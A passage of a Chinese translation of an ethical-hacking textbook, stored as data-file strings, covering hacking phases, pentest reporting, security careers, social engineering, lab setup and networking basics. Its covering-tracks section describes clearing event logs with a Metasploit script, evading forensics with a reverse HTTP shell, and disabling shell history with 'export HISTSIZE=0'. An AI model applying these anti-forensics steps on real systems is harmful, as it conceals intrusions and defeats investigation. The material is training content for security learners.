+  \n- 被动信息收集\n- 主动信息收集\n\n让我们在以下小节中学习它们。\n\n\n\n\n## 被动侦察\n\n被动侦察，顾名思义，是一种通过被动来源收集目标个人和公司信息的方法，而无需直接与预期目标交互。这是最安全的信息收集形式，因为与目标没有交互，所以无法追溯到你。被动侦察包括从公共来源收集信息，包括互联网上可用的信息。被动信息本身通常无害，但与攻击向量结合时，可能会被利用。例如，假设你访问目标的社交媒体资料，发现该人对狗非常感兴趣。这个信息本身并不是很有用。但是，如果你向他们发送一封包含网络钓鱼链接（稍后将解释网络钓鱼）的电子邮件，并包含一些关于狗的信息，那么目标更有可能点击此链接，并最终危及系统。被动侦察通常通过搜索引擎和公共数据库完成。被动侦察速度慢得多，通常只提供有关目标的有限技术数据。虽然速度较慢，但在被动侦察中被发现的风险非常低。\n\
+  \n## 主动侦察\n\n在主动侦察中，你直接与目标互动，无论是亲自还是通过计算机。主动侦察要快得多，并提供大量有关目标的信息，但代价是更高的风险。主动侦察包括查找有关目标所用系统的信息以及与目标系统相关的其他技术规格。以下是在主动侦察中寻求的最常用信息列表；但这并非详尽清单：\n\
+  \n- **IP地址**：目标的互联网协议地址，包括私有和公共地址。\n- **MAC地址**：标识目标用于连接网络的硬件接口的字段。\n- **端口**：端口扫描是主动侦察中最常用的工具之一。系统上的开放端口可用于在目标不知情的情况下与目标建立连接。\n\
+  - **目标机器上运行的服务/软件**：了解目标上运行的不同服务可能是发起攻击的良好起点。如果目标上运行的服务存在已知漏洞，则很容易被利用。\n- **操作系统指纹识别**：确定目标所使用的操作系统。\n\
+  \n## 识别弱点\n\n网络扫描和侦察会为你提供大量信息。你必须以结构化的方式跟踪获得的所有信息，这将有助于你识别相关信息。在实际案例中，黑客会进行长时间的信息收集，从几个月到几年不等。一旦你确信自己掌握了足够的信息，就可以进入下一步，即识别弱点。此步骤包括检查上一步中获得的所有信息，并确定哪些信息可用于实施攻击。\n\
+  \n## 攻击并获取访问权限\n\n一旦你确定了弱点，下一步就是开始攻击。事件响应团队的目标是限制攻击范围，并为服务提供恢复操作。一旦黑客达到目标，他们应彻底清除痕迹；否则，法医取证很容易发现他们。清除痕迹的常见方法包括删除攻击阶段创建的日志和临时文件，清理注册表项、缓存，在某些情况下还有浏览器历史记录。渗透测试人员还应了解不同操作系统的日志记录机制。例如，Windows操作系统使用*跳转列表*维护最近访问和修改文件的记录。数字取证专家利用这些技术来确定攻击者以及攻击对系统的影响程度。\n\
+  \n互联网上有许多开源工具可用于清除痕迹，这些工具在隐藏身份方面做得非常好。例如，在*Metasploit*中，你可以使用`clearv`等脚本清除Windows机器上的所有事件日志。\n\
+  \n另一种清除痕迹的方法是使用*反向HTTP shell*。Shell是在系统上执行用户命令的代码。我们将在后面的章节中详细讨论。在大多数计算机中，端口80用于HTTP数据包；因此，端口80在计算机中经常是开放的。防火墙很难区分端口80上的合法数据包和恶意数据包。使用基于HTTP的反向shell，取证分析人员很难识别黑客。\n\
+  \n一旦黑客获得系统访问权限，他们将在命令行界面上运行各种命令。一旦实现目标，黑客通常会删除命令历史记录以避免被检测。在基于Linux的系统中，可以使用`export\
+  \ HISTSIZE=0`命令完成此操作。\n\n## 报告\n\n渗透测试或道德黑客的最后一个阶段是编制一份关于系统所有弱点以及渗透测试实现目标的报告。渗透测试报告应列出有关攻击的所有必要细节。一份渗透测试报告通常包含以下内容。\n\
+  \n\n\n\n\n## Summary\n\n摘要应简要总结渗透测试。它应说明进行渗透测试的主要原因。撰写渗透测试摘要报告时应考虑以下几点：\n\n- 渗透测试的目的和目标\n\
+  - 渗透测试的范围\n- 所执行的测试的简要列表\n- 渗透测试的发现\n- 渗透测试的结论\n\n这些任务解释如下。\n\n## Introduction\n\
+  \n在介绍部分，应说明有关测试环境的所有相关信息。它应提及渗透测试从开始到结束的时间线。渗透测试花了多长时间？它应提及用于执行渗透测试的方法和方式。渗透测试期间针对了哪些系统，最后，执行了哪些类型的测试？\n\
+  \n## Methodology\n\n在本节中，我们应列出用于攻击目标的所有程序和方法。例如，我们是如何获取有关目标的信息以及我们获得了哪些信息？这些信息是如何在执行攻击中使用？使用了哪些投递载荷的方法？例如，攻击者是否向目标发送了恶意\
+  \ PDF 文件？它还应提及攻击的难度级别，即哪些方面容易攻击，哪些部分困难。\n\n## Findings\n\n发现部分应提及在渗透测试中检测到的漏洞和威胁。最好根据其严重程度将发现的漏洞数量分为不同的级别。此测试的一个示例是对设备执行漏洞扫描并检测系统上是否正在运行任何易受攻击的服务。最后，发现还应提及系统的积极方面，例如强大的防火墙配置和强密码。对于严重的漏洞和威胁，应提及深入的细节。最好将必要的屏幕截图和发现附加到文档中。\n\
+  \n## Careers in cybersecurity\n\n网络安全是一个巨大的领域，撰写其各个方面可能需要另一本书。然而，我将尝试解释网络安全的主要趋势以及你需要掌握哪些技能。一些更常见的职业在以下各节中列出，尽管这绝不是一个详尽的列表。\n\
+  \n### Systems security administration\n\n就像系统管理员的工作是维护和在组织中管理系统一样，系统安全管理员的目标是专注于系统安全的管理。他们的任务是执行日常安全任务，例如系统监控和备份管理。\n\
+  \n### Security architect\n\n网络是现代计算机系统最重要的方面之一，而且在大多数情况下，它们是攻击者进入组织的入口点，因此管理、维护和保护网络对于组织来说极其重要。安全架构师的工作包括问题报告、漏洞分析等。\n\
+  \n### Penetration tester\n\n如前所述，渗透测试者的目标是测试组织防御的强度。简单来说，渗透测试者的目标是入侵系统并获得未经授权的访问。渗透测试者的工作还包括检测系统漏洞。有时，渗透测试人员也会在事件响应团队中工作，以防御真正的威胁。渗透测试人员通常被要求设计自己的工具，专注于组织的需求。本书的大部分内容将遵循成为渗透测试人员的粗略步骤。渗透测试员是网络安全领域薪资最高的职位之一，需要很多技能。\n\
+  \n### Forensic analyst\n\n顾名思义，计算机取证分析员的工作是对数字资产进行评估，并在系统入侵的情况下审查证据。他们的任务包括在入侵后保护数字和物理证据以用于分析，以及可能在法庭上对黑客使用。取证计算机分析员必须对雇主或客户的安全问题敏感，并在处理财务和个人信息时严格遵守所有隐私程序。\n\
+  \n## Chief information security officer\n\n**首席信息安全官（CISO）** 通常是一个高管职位。CISO 的工作是监督组织的系统、网络和数据安全需求的规划、协调和指导。他们的任务是确保安全合规，评估威胁态势，并制定政策和控制措施以确保组织的安全。\n\
+  \n## Types of attacks\n\n根据执行方式的不同，存在几种不同类型的网络攻击。这些攻击的性质可能因攻击者的意图和用于攻击的工具等各种因素而异。更常见的是，这些攻击的目的是要么完全控制系统，要么窃取敏感信息，或两者兼而有之。\n\
+  \n### System control\n\n攻击通常希望接管受害者的计算机并随意操作。这可能意味着使系统对受害者无用，或进行隐秘尝试在受害者不知情的情况下获得访问权限。此类别中非常著名的一组攻击称为\
+  \ **远程访问工具攻击**。这些攻击使攻击者能够完全或几乎完全远程控制受害者的 PC。我们已经讨论过 *正向* 和 *反向* shell，它们经常被用于这些目的。\n\
+  \n### Social engineering\n\n另一种流行的攻击类型通常不需要或几乎不需要技术知识，即 **社会工程**。简单来说，社会工程意味着操纵或欺骗某人让你获得信息。与其编写冗长的代码并利用系统的技术弱点，你可以简单地欺骗某人提供信息以进行网络攻击。网络安全有两个基本方面：一个是技术方面，另一个是人为方面。安全系统与它的最薄弱环节一样好。更常见的是，系统安全的薄弱环节是人。如果有破解它的钥匙，没有系统是安全的。社会工程并不像看起来那么简单。它需要耐心和关注细节。一些更常见的社会工程技巧接下来会解释。\n\
+  \n## Baiting\n\n诱饵攻击 simply means luring the target to *bait* and then waiting for\
+  \ the target to make a mistake. 例如，黑客经常在组织办公室附近丢弃装有恶意软件的 USB 驱动器，然后等待某个员工好奇并将其插入计算机。一旦他们这样做，其余的工作就由恶意软件完成。\n\
+  \n## Phishing\n\n网络钓鱼是一种攻击技术，攻击者冒充目标信任的人。通常，他们会利用人们的兴趣。例如，如果某人是足球迷，他们更有可能打开与足球主题相关的电子邮件或链接，从而为攻击者提供攻击受害者的手段。这种攻击的一个常见例子是攻击者托管的克隆网站。攻击者会向目标发送一个假链接，该链接类似于目标所知的网站。然而，该网站将由攻击者托管，而不是去真正的网站，目标将被引导到该网站。这些克隆网站看起来与原始网站非常相似，如果你不小心，很难区分。由于这个克隆网站由黑客运营，用户输入的任何数据都会发送给黑客。检测这些假网站的一个好方法是检查网站名称以及协议。真正的网站大多在\
+  \ https 协议上运行。\n\n## Summary\n\n在本章中，我们了解了黑客攻击的基础知识以及现实世界中不同类型的黑客。然后我们详细检查了黑客攻击的步骤以及每一步包含的内容。最后，我们看到了网络安全中的不同职业以及本书如何帮助我们在这些职业中。最后，我们探索了社会工程的不同方面以及它如何被用来进行攻击。在下一章中，我们将开始学习如何设置我们的实验室环境以及我们将在本书中使用的工具。\n\
+  \n\n\n\n"
+- "# 2 开始使用 – 设置实验室环境\n\n在开始深入了解如何开始道德黑客之前，我们需要配置一些东西。在本节中，我们将学习完成本书所需的工具。本书中我们将使用的大多数工具都是免费提供的。\n\
+  \n我们将首先选择本书中使用的 Python 版本。然后，我们将把重点转移到本书中使用的集成开发环境（IDEs）。我们还将学习如何设置虚拟环境并了解它们的有用之处。之后，我们将深入研究选择操作系统（OSes），既针对攻击者也针对目标/受害者。我们将探索不同的操作系统，最后确定本书中使用的操作系统。我们还将在最后测试一个示例\
+  \ Python 脚本，以检查一切是否配置正确，并看看我们是否准备就绪。\n\n在本章中，我们将介绍以下主题：\n\n- 设置 VirtualBox\n- 安装\
+  \ Python\n- 探索 IDEs\n\n## Kali Linux\n\n要下载 Kali Linux 的虚拟镜像，请前往 Kali 的下载页面：https://www.kali.org/downloads/。\n\
+  \n让我们开始安装过程：\n\n- 1. 在下载部分，选择 Kali Linux 64-bit VirtualBox。这是一个已安装好的 Kali OS 的完整镜像，因此你无需安装任何东西：\n\
+  \n| Kali Linux 64-bit VMware | 可在 Offensive Security VM 下载页面获得 |\n| Kali Linux 32-bit\
+  \ (PAE) VMware | 可在 Offensive Security VM 下载页面获得 |\n| Kali Linux 64-bit VirtualBox\
+  \ | 可在 Offensive Security VM 下载页面获得 |\n| Kali Linux 32-bit (PAE) VirtualBox | 可在\
+  \ Offensive Security VM 下载页面获得 |\n\n图 2.2 – Kali Linux VirtualBox 镜像\n\n- 2. 下载时间取决于你的网络速度。镜像下载完成后，只需将其导入\
+  \ VirtualBox。要导入 Kali 机器，请在工具选项卡中点击导入按钮，如以下屏幕截图所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_44_0.png)\n\
+  \n图 2.3 – 导入 Kali 虚拟机\n\n- 3. 这将打开一个对话框，你可以选择刚刚下载的 kali 机器 ova 文件。\n\n启动时，系统会要求你输入密码以登录\
+  \ Kali Linux 系统。该镜像的默认凭据如下：\n\n| 用户名 | Kali |\n| 密码 | kali |\n\n> **重要提示**\n> 你可能需要在设置中禁用\
+  \ USB 2 支持才能正常启动机器。\n\n系统启动后，应该看起来像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_45_0.png)\n\
+  \n图 2.4 – Kali Linux 主屏幕\n\n现在我们已经设置好了攻击者机器，让我们继续设置受害者机器。\n\n## 受害者机器操作系统\n\n对于受害者机器，我们将使用\
+  \ Windows 10 作为操作系统。你有两个选择；要么使用 ISO 文件从头安装 Windows 10 操作系统，要么下载适用于 VirtualBox 的预构建镜像。第二种选项更简单，我推荐使用它。然而，其缺点是它相当大，约为\
+  \ 20 GB，并且只能使用 90 天，之后就会过期。不过，这段时间对于大多数用途来说已经足够了。如果你的需求超过 90 天，你可以手动在 VirtualBox\
+  \ 上安装 Windows 10。互联网上有大量教程可供此用途参考。\n\n让我们在本章中使用预构建选项。使用以下链接下载预构建镜像：https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/。\n\
+  \n让我们看看如何在 VirtualBox 中使用它：\n\n- 1. 下载 Windows 10 VirtualBox 镜像后，打开 VirtualBox 并点击\
+  \ **添加**。\n- 2. 将打开一个对话框；选择刚刚下载的 Windows 10 镜像。\n\n如果步骤操作正确，你的 Windows 10 现在应该可以正常运行了。虚拟\
+  \ Windows 的 VirtualBox 界面应如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_46_0.png)\n\
+  \n图 2.5 – Windows 虚拟机\n\n我们系统的拓扑结构如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_47_0.png)\n\
+  \n图 2.6 – 主机 Windows 10 操作系统\n\n虚拟操作系统安装完成后，VirtualBox 软件应如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_47_1.png)\n\
+  \n图 2.7 – VirtualBox\n\n到目前为止，我们已在主机机器上安装了虚拟操作系统。接下来，我们将专注于根据我们的喜好配置这些机器，以便在本书剩余部分中使用。在下一节中，我们将在这些虚拟机上下载并安装\
+  \ Python 3。\n\n## 安装 Python\n\n本章接下来需要设置的是 Python。本书中我们将使用 Python 版本 3，即 python3。Python\
+  \ 3 是 Python 的 *主要* 版本，与旧的版本 2 不兼容。要下载 Python，请前往 https://www.python.org/ 并下载最新版本。截至撰写时，Python\
+  \ 3.8 是推荐版本；然而，对于本书来说，3.2 以上的任何 Python 版本都应该可以。推荐使用 64 位版本的 Python。我将假设你使用 Windows\
+  \ 作为主要操作系统；然而，本书中提到的代码也应该在 Linux 和 macOS 上运行，因为我们将运行虚拟机。\n\n### 在 Windows 上安装 Python\n\
+  \n在 Windows 上安装 Python 的过程相当简单。打开你在 *安装虚拟操作系统* 部分中刚刚安装的 Windows 10 虚拟机。请注意，从现在开始，大多数工作将在这些虚拟机上完成，而不是承载这些虚拟机的访客操作系统。在安装过程中，只需勾选\
+  \ **将 Python 3.8 添加到 PATH** 选项（版本号取决于你下载的版本），这样你就可以从命令提示符的任何位置访问 Python：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_48_0.png)\n\
+  \n图 2.8 – Python 安装\n\n选择图 2.8 中突出显示的此选项后，点击 **立即安装**。安装完成后，关闭安装窗口并打开终端/命令提示符。在命令提示符中，只需输入\
+  \ python 命令。你应该在终端中看到以下输出。Python shell 现在应该已打开：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_49_0.png)\n\
+  \n图 2.9 – Python shell\n\n现在我们已在 Windows 中设置了 Python，让我们继续在 Kali 安装上进行设置。\n\n###\
+  \ 在 Kali Linux 上安装 Python\n\n大多数渗透测试操作系统都已预装了 Python。要检查你的发行版是否已安装 Python，请打开 Kali\
+  \ 并搜索终端。打开终端并在终端中输入以下命令：\n\n```\npython --version\n```\n\n你应该会看到以下输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_49_1.png)\n\
+  \n图 2.10 – Python 版本\n\n前面的结果显示 Python 版本 2 已安装；然而，我们需要 Python 3。让我们再次使用以下命令检查：\n\
+  \n```\npython3 --version\n```\n\n你应该会看到以下输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_49_2.png)\n\
+  \n图 2.11 – Python 3 版本号\n\n前面的屏幕截图显示 Kali 中也已安装 Python 3，因此我们无需再次安装。\n\n## 集成开发环境\n\
+  \nIDE 是一段帮助我们高效编写代码的软件。你也可以在记事本中编写 Python 脚本；然而，IDE 提供了帮助我们轻松编写代码的功能。有很多选择。我们将专注于免费的\
+  \ IDE。我发现的最佳选择是 Visual Studio Code（VS Code），它完全免费。继续为两个虚拟操作系统 Windows 10 和 Kali\
+  \ 下载 VS Code：https://code.visualstudio.com/download。\n\n在 Windows 上安装很简单：你需要按照安装程序进行操作。在\
+  \ Linux 上安装需要你下载一个 Debian 软件包文件。打开终端并导航到下载文件的位置。然后，运行此命令：\n\n```\nsudo dpkg -i /path/to/file\n\
+  ```\n\n它看起来会像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_50_0.png)\n\n请注意，它会提示你输入密码以进行安装。\n\
+  \n安装完成后，你需要安装扩展。打开 VS Code 并点击 VS Code 左侧的扩展选项卡，搜索 Python。它应该看起来像这样：\n\n\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_51_0.png)\n\
+  \nFigure 2.13 – Python extension\n\n点击 Install 按钮，安装应该只需要几秒钟。现在你几乎已经准备好开始你的道德黑客之旅了。到目前为止，我们已经设置了虚拟操作系统，在这些机器上安装了\
+  \ Python，并安装了 VS Code 以及相关的扩展，这些扩展将在我们的旅程中帮助我们。在下一节中，我们将进行一些网络配置以帮助我们。\n\n### Setting\
+  \ up networking\n\n默认情况下，所有虚拟机都会为网络创建一个单独的虚拟接口。这意味着虚拟操作系统设备与你的主机操作系统处于不同的子网中。为了确保所有操作系统都在同一个子网中，请执行以下操作：\n\
+  \n1. 进入每个虚拟机的设置。\n2. 在网络设置中，将 Attached to 选项选择为 Bridged Adapter。\n\n请确保同时对 Windows\
+  \ 和 Kali 安装执行此操作：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_52_0.png)\n\nFigure\
+  \ 2.14 – Setting the network adapter\n\n现在你的所有设备都将在同一个子网中。你应该能够从 Windows 10 安装 ping\
+  \ 通 Kali 安装。\n\n### Updating Kali\n\n在继续之前，最好先更新 Kali 以确保一切都是最新的。Kali 可以使用以下命令进行更新：\n\
+  \n```\nsudo apt-get update\nsudo apt-get upgrade\n```\n\n更新过程需要一些时间，因为它会更新所有仓库。\n\
+  \n### Using virtual environments\n\nPython 有一个非常不错的功能叫做虚拟环境。使用这些虚拟环境，你可以跟踪不同 Python\
+  \ 项目的依赖关系，并将不同项目与主环境隔离开来。\n\n让我们在 Kali 中创建一个新文件夹，所有项目文件都将放在这里：\n\n1. 打开你的 Kali 主目录并创建一个名为\
+  \ `python-hacking` 的新文件夹。所有未来的工作都将在此进行。\n\n2. 在 VS Code 中打开此文件夹：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_53_0.png)\n\
+  \nFigure 2.15 – Folder structure inside VS Code\n\n3. 在 `python-hacking` 文件夹内，创建一个名为\
+  \ `m1-hello-world` 的新文件夹。在这里我们将测试我们的虚拟环境。在 `m1-hello-world` 文件夹内，创建一个名为 `main.py`\
+  \ 的新文件。\n\n4. 使用以下命令在终端中检查 Python 包管理器 `pip` 是否已正确安装在 Kali 中：\n\n```\npip3 --version\n\
+  ```\n\n你应该会看到以下输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_53_1.png)\n\nFigure\
+  \ 2.16 – pip not installed\n\n5. 如果你看到与前面类似的输出，这意味着 `pip` 未安装在系统上。要安装 `pip`，请运行以下命令。确保系统已更新：\n\
+  \n```\nsudo apt install python3-pip\n```\n\n一旦 pip 正确安装，输出将如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_53_2.png)\n\
+  \nFigure 2.17 – pip installation\n\n如果 Windows 中尚未存在，也请安装 pip3。\n\n6. 现在打开 main.py\
+  \ 文件并编写一些 Python 代码。我们将只使用以下代码。要在 VS Code 中打开终端，请按 Ctrl + `。\n\n7. 现在我们将安装一个 Python\
+  \ 虚拟环境模块。运行以下命令进行安装：\n\n```\napt-get install python3-venv\n```\n\n8. 一旦 Python 虚拟环境模块安装完成，我们可以通过在终端中简单运行以下命令来创建一个\
+  \ virtual-env 文件夹：\n\n```\npython3 -m venv my-virtualenv\n```\n\n9. 如果命令运行成功，你将看到一个名为\
+  \ my-virtualenv 的新文件夹已创建。此文件夹包含一个与系统环境隔离的 Python 环境。要启用此环境，请运行以下命令：\n\n```\nsource\
+  \ my-virtualenv/bin/activate\n```\n\n它看起来像 Figure 2.18 中的输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_54_0.png)\n\
+  \nFigure 2.18 – Activating an environment\n\n一旦环境被激活，你会看到环境名称 my-virtualenv 显示在每条终端行的开头。现在你在此\
+  \ shell 中使用 pip 安装的每个包都只会安装在此环境中，并与主环境隔离。\n\n在 python 文件中编写以下代码以测试一切是否正常工作：\n\n\
+  ```\nif __name__ == \"__main__\":\n    print(\"Hello world\")\n```\n\n你应该会看到以下内容：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_55_0.png)\n\nFigure 2.19 – Sample Python\
+  \ script\n\n要运行它，请使用以下命令：\n\n```\npython3 main.py\n```\n\n你应该会看到以下内容：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_55_1.png)\n\
+  \nFigure 2.20 – Running the Python script\n\n如果看到输出 hello world 显示出来，这意味着一切都已正确安装。\n\
+  \n### Summary\n\n让我们总结一下本章我们做了什么。我们从在主机上下载和安装虚拟操作系统开始。然后我们在系统中配置了 Python，我们将在本书其余部分中使用它。然后我们为虚拟机配置了网络，并在本章末尾学习了如何在\
+  \ Python 中使用虚拟环境。这些在后面的章节中将非常有帮助，当我们想要从代码中创建可分发的二进制文件时。在下一章中，我们将介绍网络的介绍以及它如何用于道德黑客。\n"
+- '# Section 2: Thinking Like a Hacker – Network Information Gathering and Attacks
+
+
+  本节的目的是开发可用于渗透测试的动手工具。本节将从应用信息收集技术开始，以开发能够让黑客攻击受害者机器并远程控制受害者机器的程序。在本节中，你将学习如何成功攻击一台机器并在受害者未察觉的情况下访问受害者机器的大部分内容。
+
+
+  本书的这一部分包含以下章节：
+
+
+  - Chapter 3, Reconnaissance and Information Gathering
+
+  - Chapter 4, Network Scanning
+
+  - Chapter 5, Man in the Middle Attacks
+
+  '
+- "## 3 Reconnaissance and Information Gathering\n\n在本章中，我们将学习网络基础知识。如果没有对计算机网络的扎实理解，你将无法在渗透测试和道德黑客领域走得很远。我们将介绍网络工作原理的一些基本细节。我们还将了解网络中不同的抽象层以及每个层的作用。\n\
+  \n每个道德黑客流程都始于收集有关目标的相关信息，本章专门介绍我们可以获得哪些类型的信息以及这些信息如何对我们有用。我们将讨论用于描述网络层的标准 OSI 模型以及该模型如何对我们有所帮助。本章将涵盖以下主题：\n\
+  \n- What is a computer network?\n- Classifying networks\n- Network stack\n- Network\
+  \ entities\n- Protection\n- Changing MAC\n\n### What is a computer network?\n\n\
+  在 **信息技术 (IT)** 领域，**网络** 意味着 *两台或更多设备* 能够 *通信* 并相互 *交换数据* 的 *能力*。在计算的早期，计算机无法相互通信，而是独立的系统。它们的功能非常有限。随着技术的进步，设备之间通信的需求日益增长。在最简单的形式中，两台通过\
+  \ *介质* 相互连接的计算机形成了一个网络。这个介质是这些设备相互通信的 *链路*。随着我们的深入，你会看到计算机网络中的事情会变得非常复杂：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_60_0.png)\n\
+  \n正如你在以下章节中会看到的那样，大多数现代计算机网络并非如此构建。为了让你的计算机与其他计算机通信，它需要与它拥有的计算机一样多的链路，这很快就会变得难以管理。我们将在\
+  \ *Components of a computer network* 部分学习如何通过使用一个称为路由器的中间节点来避免这个问题。那么，当你想要一个包含 10\
+  \ 台设备的网络时会发生什么呢？为此，我们可以让每台设备与每台其他设备之间都运行电缆并让它们通信。下面的图表显示了四台计算机相互通信。正如你能想象的那样，这样的系统会变得指数级难以管理。这有几个缺点。例如，它增加了系统的复杂性并浪费了大量资源，因为即使它们\
+  \ *通信* 的时间非常短，你也需要在两台计算机之间维护一根电缆：\n\n\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_61_0.png)\n\
+  \nFigure 3.2 – Network with four nodes\n\n为了消除这种冗余，我们可以引入一个中央设备来负责让不同的设备相互通信。有不同类型的中央设备，我们将在\
+  \ Components of a basic computer network 部分中全部探讨：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_61_1.png)\n\
+  \nFigure 3.3 – Network with a central device\n\n上图与我们家庭中的网络相似。一个中央设备——在我们的例子中是路由器——帮助我们与其他设备通信。这是一种非常原始的网络形式；现实生活中的网络比这个复杂得多。回到网络构成的概念，网络仅仅是两个通过介质相互通信并共享数据的设备。现在我们已经了解了网络是什么并开始讨论构建网络所需的内容，让我们详细查看组件。\n\
+  \n## Components of a basic computer network\n\n在本节中，我们将学习计算机网络的不同组件。在计算机网络文献中，你经常会看到\
+  \ *node* 这个术语用来表示网络中的一台计算机。在网络领域中，使用特定的命名法来识别网络中的特定设备。我们接下来将查看这些术语。\n\n### Node\n\
+  \n节点通常是连接到 *central* 设备的设备。从某种意义上说，它是参与通信网络的计算机。这对于简单的小型网络是可行的，但随着网络中添加的设备越来越多，不同的设备开始承担不同的角色，因此我们只能在一定程度上将设备的角色在网络中简化为节点。在合格的场景中，节点可以是你的笔记本电脑、台式电脑、打印机、平板电脑、手机或任何其他网络连接设备。\n\
+  \n### Server\n\n服务器是保存一些可以通过网络共享给需要它们的设备的信息的计算机。服务器通常 *online*，这意味着它们通过持续可用于其他设备来\
+  \ *serve* 设备。\n\n### Transmission media\n\n设备在网络中相互连接并能够通信所使用的资源/链路称为 *transmission\
+  \ media*。它可以是有线和无线的。有线传输介质的例子是 *Ethernet cable*，通常用于本地网络。*Wi-Fi* 是无线传输介质的例子。\n\n\
+  ### Network interface card\n\n要参与网络，连接的节点/设备必须具有称为 **Network Interface Card (NIC)**\
+  \ 的东西。NIC 的作用是将你想要传输的内容转换为传输介质所接受的形式。\n\n### Hub\n\n集线器是网络中的中央设备。如果你想与网络中的一个节点通信，你可能不会直接链接到该节点。相反，你应该通过某个中央设备——在这种情况下是集线器——建立链接。你的消息/数据将发送到集线器，然后集线器会将其广播到整个网络。根据消息的内容，相应的设备会做出回应。\n\
+  \n### Switch\n\n交换机是一种特殊的集线器。与广播消息给所有节点的集线器不同，交换机只将消息发送给预期的接收者。这大大减少了网络上的流量，因为不打算接收消息的设备不应接收消息。\n\
+  \n### Router\n\n到目前为止，我们一直在谈论单个网络。如果一台计算机想与不在你网络中的计算机交谈怎么办？如果这台计算机在法国，而预期的接收计算机在美国的网络中怎么办？我们可以将计算机互连的概念扩展到网络互连。路由器是帮助我们与外部网络通信的设备。\n\
+  \n### Gateway\n\n网关是网络中的端点路由器。所有进出网络的流量都经过它。它充当互联网与本地设备之间的中介。对于我们自己的网络之外的设备来说，网关是本地网络中任何设备的通信主要点。\n\
+  \n### Firewall\n\n防火墙是某些网络中的可选设备。防火墙可以是基于软件的，例如操作系统的防火墙，也可以是整个网络的基于硬件的设备。防火墙的作用是增强系统的安全性并监控网络流量。这确保了不会对网络进行未经授权的访问。防火墙通常会阻止所有进入本地网络的连接请求，除非这些请求已被授权并在防火墙的规则引擎中提及：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_64_0.png)\n\nFigure 3.4 – Components\
+  \ in a network\n\n顾名思义，它充当本地网络的入口点，也是出口点。出于实际原因和小型网络的原因，网络的小组件，如路由器、交换机、网关，有时甚至是防火墙，都合并到单个物理设备中。\n\
+  \n在本节中，我们了解了网络的不同组件以及每个组件的作用。接下来，我们将讨论这些不同网络是如何分类的。\n\n## Classifying network\n\n\
+  随着越来越多的计算机开始连接，将它们分类到不同的类别变得至关重要，以便我们可以使用它们。有各种方法可以进行分类；然而，最常见的是基于地理的网络分类。我们接下来将讨论这一点。\n\
+  \n### Local area network\n\n当你将笔记本电脑或手机连接到家中 Wi-Fi 路由器时，你本质上参与了一个 **local area network\
+  \ (LAN)**。连接到 LAN 的方式有多种，例如使用 Wi-Fi，这是一种无线连接，或使用有线连接，例如以太网电缆。LAN 的构成没有严格定义。然而，LAN\
+  \ 通常由位于同一建筑物中同一区域的设备组成。LAN 可以简单到两个设备连接到路由器，也可以复杂到大学和办公室的 LAN。\n\n### Ethernet\n\n\
+  以太网是 LAN 中使用最广泛的技术之一。现代以太网协议在 LAN 中提供非常高的速度。与无线介质相比，它非常可靠且安全。以太网协议定义了数据如何在 LAN 上传输。现代以太网可以提供每秒吉比特量级的速度。\n\
+  \n### Wi-Fi\n\n作为以太网的补充，以太网使用物理电缆将设备连接到网络，而 Wi-Fi 允许设备通过无线介质相互连接。这消除了对电线的需求。需要注意的是，即使是无线，LAN\
+  \ 上设备之间的通信也不是直接的。数据仍然通过一个中央路由器，即 **Access Point (AP)**，转发给预期接收者。\n\n这两种介质的比较如下：\n\
+  \n| Feature | Wi-Fi | Ethernet |\n|---|---|---|\n| Transmission media | Over a wireless\
+  \ channel | Connected through cables |\n| Accessibility | Everywhere we can receive\
+  \ signals | Only by cables |\n| Speeds | Slow compared to cables | Fastest option\
+  \ |\n| Reliability | Depends on the environment | Consistent |\n| Security | If\
+  \ unencrypted, data can be intercepted easily over wireless channels | More secure\
+  \ due to the need for physical interception |\n| deployment | Easy | Requires network\
+  \ infrastructure such as ports and cables to be setup |\n| Latency | High and variable\
+  \ | Low and consistent |\n\nTable 1.1 – Wi-Fi versus ethernet\n\n这两种介质各有利弊。无线对于普通用户来说使用起来容易得多，并给予他们在网络中更大的移动自由，而基于电缆的以太网速度快得多，并且在网络对移动性需求较低时经常使用。现在我们已经了解了\
+  \ LAN，我们将开始查看其他基于地理的网络。\n\n### Personal area network\n\n与 LAN 相比，个人区域网络 PAN 通常非常小。PAN\
+  \ 的范围仅在几十米量级。PAN 的一个例子是两个基于蓝牙的设备相互通信。在极少数情况下，PAN 也连接到 LAN。\n\n### Metropolitan area\
+  \ networks\n\n有时，我们倾向于将几个小型局域网合并为一个单一类别。它们通常称为 metropolitan area networks (MANs)。MAN\
+  \ 的一个例子是位于城市不同区域的政府办公室连接到单一网络。这些网络通常仅限于一个城市。\n\n\n\n\n\n## 广域网\n\n顾名思义，广域网（WAN）是指跨越较大地理区域的网络。WAN\
+  \ 通常构成一个国家内部的网络。\n\n## 因特网\n\n到目前为止，我们只讨论了同一地理位置内的网络。互联网络，或因特网，是一个将位于不同地理位置的网络相互连接起来的巨型网络。通过这个庞大的网络，只要它也连接到因特网，你就可以与世界任何地方的任何设备进行通信。不同的\
+  \ WAN 通过超高速光纤网络相互连接：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_67_0.png)\n\n图\
